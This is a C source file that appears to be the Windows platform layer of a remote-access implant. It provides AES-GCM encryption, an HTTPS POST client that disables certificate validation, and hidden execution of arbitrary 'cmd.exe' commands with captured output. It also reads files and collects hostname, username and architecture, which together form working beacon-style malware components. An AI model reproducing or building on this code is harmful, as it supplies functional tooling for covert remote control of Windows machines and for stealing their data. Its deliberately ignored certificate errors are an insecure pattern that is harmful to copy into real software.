#include "port.h"

#include <windows.h>
#include <bcrypt.h>
#include <winhttp.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int sys_init(void) { return 0; }
void sys_shutdown(void) {}

void rand_bytes(unsigned char *out, size_t n) {
    typedef BOOLEAN(WINAPI * rtlgenrandom_fn)(unsigned char *, unsigned long);
    if (BCryptGenRandom(NULL, out, (ULONG)n, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0) {
        return;
    }
    {
        HMODULE mod = GetModuleHandleA("advapi32.dll");
        rtlgenrandom_fn fn = (rtlgenrandom_fn)GetProcAddress(mod, "SystemFunction036");
        if (fn && fn(out, (unsigned long)n)) return;
    }
    exit(1);
}

int sha256(const unsigned char *in, size_t n, unsigned char out[32]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    NTSTATUS st = BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (st != 0) return -1;
    st = BCryptCreateHash(alg, &hash, NULL, 0, NULL, 0, 0);
    if (st == 0) st = BCryptHashData(hash, (PUCHAR)in, (ULONG)n, 0);
    if (st == 0) st = BCryptFinishHash(hash, out, 32, 0);
    if (hash) BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);
    return st == 0 ? 0 : -1;
}

static int gcm_crypt(int encrypt, const unsigned char key[32], const unsigned char nonce[12],
                     const unsigned char *in, size_t in_len,
                     unsigned char *out, size_t out_len, unsigned char tag[16]) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE k = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    NTSTATUS st;
    ULONG done = 0;
    int ok = 0;

    st = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (st != 0) return -1;
    st = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                           sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (st != 0) goto done;
    st = BCryptGenerateSymmetricKey(alg, &k, NULL, 0, (PUCHAR)key, 32, 0);
    if (st != 0) goto done;

    memset(&info, 0, sizeof info);
    info.cbSize = sizeof info;
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    info.pbNonce = (PUCHAR)nonce;
    info.cbNonce = 12;
    info.pbTag = tag;
    info.cbTag = 16;

    if (encrypt) {
        st = BCryptEncrypt(k, (PUCHAR)in, (ULONG)in_len, &info, NULL, 0,
                           out, (ULONG)out_len, &done, 0);
    } else {
        st = BCryptDecrypt(k, (PUCHAR)in, (ULONG)in_len, &info, NULL, 0,
                           out, (ULONG)out_len, &done, 0);
    }
    if (st == 0 && done == (ULONG)in_len) ok = 1;
done:
    if (k) BCryptDestroyKey(k);
    BCryptCloseAlgorithmProvider(alg, 0);
    return ok ? 0 : -1;
}

int aes_gcm_seal(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *pt, size_t pt_len,
                 unsigned char *ct, size_t ct_len, unsigned char tag[16]) {
    return gcm_crypt(1, key, nonce, pt, pt_len, ct, ct_len, tag);
}

int aes_gcm_open(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *ct, size_t ct_len, const unsigned char tag[16],
                 unsigned char *pt, size_t pt_len) {
    return gcm_crypt(0, key, nonce, ct, ct_len, pt, pt_len, (unsigned char *)tag);
}

uint64_t now_unix(void) { return (uint64_t)_time64(NULL); }

void sleep_sec(double s) {
    if (s < 0) s = 0;
    Sleep((DWORD)(s * 1000.0));
}

static wchar_t *to_wide(const char *s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w;
    if (n <= 0) return NULL;
    w = (wchar_t *)malloc((size_t)n * sizeof(wchar_t));
    if (!w) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

int http_post(const char *url, const char *ua, const char *body, size_t body_len,
              long *status_code, char **resp, size_t *resp_len) {
    wchar_t *wide_url = NULL, *wide_ua = NULL;
    URL_COMPONENTSW parts;
    HINTERNET session = NULL, connect = NULL, request = NULL;
    wchar_t host[256], path[512];
    DWORD status = 0, status_size = sizeof status, downloaded = 0, total = 0;
    char *buf = NULL;
    int ret = -1;

    wide_url = to_wide(url);
    wide_ua = to_wide(ua);
    if (!wide_url || !wide_ua) goto done;

    ZeroMemory(&parts, sizeof parts);
    parts.dwStructSize = sizeof parts;
    parts.lpszHostName = host;
    parts.dwHostNameLength = 255;
    parts.lpszUrlPath = path;
    parts.dwUrlPathLength = 511;
    if (!WinHttpCrackUrl(wide_url, 0, 0, &parts)) goto done;

    session = WinHttpOpen(wide_ua, WINHTTP_ACCESS_TYPE_NO_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) goto done;
    WinHttpSetTimeouts(session, 15000, 15000, 30000, 30000);
    connect = WinHttpConnect(session, parts.lpszHostName, parts.nPort, 0);
    if (!connect) goto done;
    request = WinHttpOpenRequest(connect, L"POST", parts.lpszUrlPath, NULL,
                                 WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                 WINHTTP_FLAG_SECURE);
    if (!request) goto done;
    {
        static const wchar_t headers[] =
            L"Content-Type: application/json\r\n"
            L"Accept: application/json\r\n"
            L"Accept-Language: en-US,en\r\n";
        WinHttpAddRequestHeaders(request, headers, (DWORD)-1, 0);
    }
    {
        /* Cert validation is intentionally lenient: the AEAD key authenticates
           the server. Retry-once covers stacks that ignore a pre-send flag. */
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof flags);
    }
    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) {
        DWORD err = GetLastError();
        if (err != ERROR_WINHTTP_SECURE_FAILURE) goto done;
        {
            DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
            if (!WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof flags)) goto done;
            if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) goto done;
        }
    }
    if (!WinHttpReceiveResponse(request, NULL)) goto done;
    if (!WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
                             WINHTTP_NO_HEADER_INDEX)) goto done;

    buf = (char *)malloc(8192);
    if (!buf) goto done;
    for (;;) {
        DWORD avail = 0;
        if (total >= (size_t)RESP_MAX_BODY) break;
        if (!WinHttpQueryDataAvailable(request, &avail) || avail == 0) break;
        if ((size_t)avail > (size_t)RESP_MAX_BODY - total) avail = (DWORD)((size_t)RESP_MAX_BODY - total);
        {
            char *grown = (char *)realloc(buf, total + avail);
            if (!grown) break;
            buf = grown;
        }
        if (!WinHttpReadData(request, buf + total, avail, &downloaded)) break;
        if (downloaded == 0) break;
        total += downloaded;
        if (total > RESP_MAX_BODY) break;
    }
    ret = 0;
done:
    if (request) WinHttpCloseHandle(request);
    if (connect) WinHttpCloseHandle(connect);
    if (session) WinHttpCloseHandle(session);
    free(wide_url);
    free(wide_ua);
    if (ret == 0) {
        if (!buf) {
            buf = (char *)malloc(1);
            total = 0;
            if (!buf) return -1;
        }
        *status_code = (long)status;
        *resp = buf;
        *resp_len = total;
        return 0;
    }
    free(buf);
    return -1;
}

static void stop_tree(HANDLE job, HANDLE process) {
    if (job) TerminateJobObject(job, 1);
    else if (process) TerminateProcess(process, 1);
}

int exec_cmd(const char *cmd, int timeout_sec, unsigned char **out, size_t *out_len, int *exit_code) {
    SECURITY_ATTRIBUTES sa;
    HANDLE rd = NULL, wr = NULL, job = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char *cmdline = (char *)malloc(strlen(cmd) + 32);
    unsigned char *buf = (unsigned char *)malloc(8192);
    size_t cap = 8192, len = 0;
    ULONGLONG deadline;

    *exit_code = -1;
    *out = (unsigned char *)malloc(1);
    *out_len = 0;
    if (*out) (*out)[0] = 0;
    if (!cmdline || !buf) {
        free(cmdline);
        free(buf);
        return 0;
    }
    job = CreateJobObjectA(NULL, NULL);
    if (job) {
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli;
        ZeroMemory(&jeli, sizeof jeli);
        jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation, &jeli, sizeof jeli)) {
            CloseHandle(job);
            job = NULL;
        }
    }
    if (timeout_sec <= 0 || timeout_sec > 600) timeout_sec = 30;
    sprintf(cmdline, "cmd.exe /c %s", cmd);

    sa.nLength = sizeof sa;
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        if (rd) CloseHandle(rd);
        if (wr) CloseHandle(wr);
        free(cmdline);
        free(buf);
        if (job) CloseHandle(job);
        return 0;
    }
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&si, sizeof si);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    ZeroMemory(&pi, sizeof pi);
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(rd);
        CloseHandle(wr);
        free(cmdline);
        free(buf);
        if (job) CloseHandle(job);
        return 0;
    }
    if (job && !AssignProcessToJobObject(job, pi.hProcess)) {
        CloseHandle(job);
        job = NULL;
    }
    CloseHandle(wr); /* parent copy must be gone to observe EOF */
    deadline = GetTickCount64() + (ULONGLONG)timeout_sec * 1000;

    for (;;) {
        DWORD avail = 0, read_n = 0;
        if (!PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            char *grown;
            size_t ncap;
            if (len >= (size_t)OUT_CAP) { stop_tree(job, pi.hProcess); break; }
            if ((size_t)avail > (size_t)OUT_CAP - len) avail = (DWORD)((size_t)OUT_CAP - len);
            ncap = cap;
            while (ncap < len + avail) {
                if (ncap > (size_t)OUT_CAP / 2) { ncap = (size_t)OUT_CAP + 1; break; }
                ncap *= 2;
            }
            if (ncap > cap) {
                grown = (char *)realloc(buf, ncap);
                if (!grown) break;
                buf = (unsigned char *)grown;
                cap = ncap;
            }
            if (cap <= len) { stop_tree(job, pi.hProcess); break; }
            if (!ReadFile(rd, buf + len, (DWORD)(cap - len), &read_n, NULL)) break;
            len += read_n;
            if (len >= (size_t)OUT_CAP) { stop_tree(job, pi.hProcess); break; }
            continue;
        }
        if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
            for (;;) { /* drain leftovers */
                DWORD a2 = 0;
                if (!PeekNamedPipe(rd, NULL, 0, NULL, &a2, NULL) || a2 == 0) break;
                if (len >= (size_t)OUT_CAP) break;
                if (len + a2 > cap) {
                    char *grown;
                    size_t ncap = cap;
                    while (len + a2 > ncap) {
                        if (ncap > (size_t)OUT_CAP) break;
                        ncap *= 2;
                    }
                    if (ncap > (size_t)OUT_CAP + 1) ncap = (size_t)OUT_CAP + 1;
                    if (ncap <= cap) break;
                    grown = (char *)realloc(buf, ncap);
                    if (!grown) goto finish;
                    buf = (unsigned char *)grown;
                    cap = ncap;
                }
                if (!ReadFile(rd, buf + len, (DWORD)(cap - len), &read_n, NULL) || read_n == 0) break;
                len += read_n;
                if (len >= (size_t)OUT_CAP) break;
            }
            break;
        }
        if (GetTickCount64() >= deadline) { stop_tree(job, pi.hProcess); break; }
    }
finish:
    WaitForSingleObject(pi.hProcess, 5000);
    {
        DWORD code = 0;
        if (GetExitCodeProcess(pi.hProcess, &code)) *exit_code = (int)code;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(rd);
    if (job) CloseHandle(job);
    free(cmdline);
    free(*out);
    *out = buf;
    *out_len = len;
    return 0;
}

int read_file_bytes(const char *path, unsigned char **out, size_t *out_len, int *err_code) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    LARGE_INTEGER size;
    unsigned char *buf;
    size_t total = 0;

    *out = (unsigned char *)malloc(1);
    *out_len = 0;
    if (*out) (*out)[0] = 0;
    if (h == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        *err_code = (e == ERROR_FILE_NOT_FOUND || e == ERROR_PATH_NOT_FOUND) ? 1 : 2;
        return 0;
    }
    if (GetFileType(h) != FILE_TYPE_DISK) {
        CloseHandle(h);
        *err_code = 2;
        return 0;
    }
    if (!GetFileSizeEx(h, &size) || size.QuadPart < 0 || size.QuadPart > FILE_CAP) {
        CloseHandle(h);
        *err_code = 3;
        return 0;
    }
    buf = (unsigned char *)malloc(size.QuadPart > 0 ? (size_t)size.QuadPart : 1);
    if (!buf) { CloseHandle(h); *err_code = 2; return 0; }
    while (total < (size_t)size.QuadPart) {
        DWORD rd = 0;
        if (!ReadFile(h, buf + total, (DWORD)((size_t)size.QuadPart - total), &rd, NULL) || rd == 0) break;
        total += rd;
    }
    CloseHandle(h);
    free(*out);
    *out = buf;
    *out_len = total;
    *err_code = 0;
    return 0;
}

void host_info(char *hostname, size_t hn, char *username, size_t un,
               char *os, size_t on, char *arch, size_t an, uint32_t *pid) {
    DWORD n;
    SYSTEM_INFO si;

    n = (DWORD)hn;
    if (!GetComputerNameExA(ComputerNameDnsHostname, hostname, &n)) hostname[0] = '\0';
    n = (DWORD)un;
    if (!GetUserNameA(username, &n)) username[0] = '\0';
    snprintf(os, on, "windows");
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) snprintf(arch, an, "amd64");
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) snprintf(arch, an, "arm64");
    else snprintf(arch, an, "unknown");
    *pid = (uint32_t)GetCurrentProcessId();
}
